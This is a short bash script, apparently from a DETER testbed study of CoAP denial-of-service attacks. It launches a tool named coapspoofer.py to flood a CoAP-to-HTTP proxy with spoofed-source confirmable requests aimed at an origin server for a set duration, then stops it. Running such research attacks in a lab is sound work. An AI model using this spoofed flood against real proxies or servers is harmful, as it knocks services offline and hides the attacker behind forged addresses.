#!/bin/bash

source /proj/MIT-DoS/exp/coap-setup/deps/californium/deter/scripts/config.sh

rm -f $TMP_DATA/$ATTACKER_LOGNAME
touch $TMP_DATA/$ATTACKER_LOGNAME

PROXY_IP=$PROXY_IP_FOR_ATTACKER

(python3 $DETER_HOME/coapspoofer.py \
  --debug \
  --source $ATTACKER_SPOOFED_IP \
  --src-port $ATTACKER_SPOOFED_PORT \
  --destination $PROXY_IP \
  --dst-port $PROXY_COAP_PORT \
  --message-type CON \
  --code 001 \
  --uri-host $PROXY_IP \
  --uri-path coap2http \
  --proxy-uri http://$ORIGIN_SERVER_IP:$ORIGIN_SERVER_PORT \
  --flood True > $TMP_DATA/$ATTACKER_LOGNAME) &

spoofer_pid=$!

sleep $ATTACKER_DURATION

kill $spoofer_pid
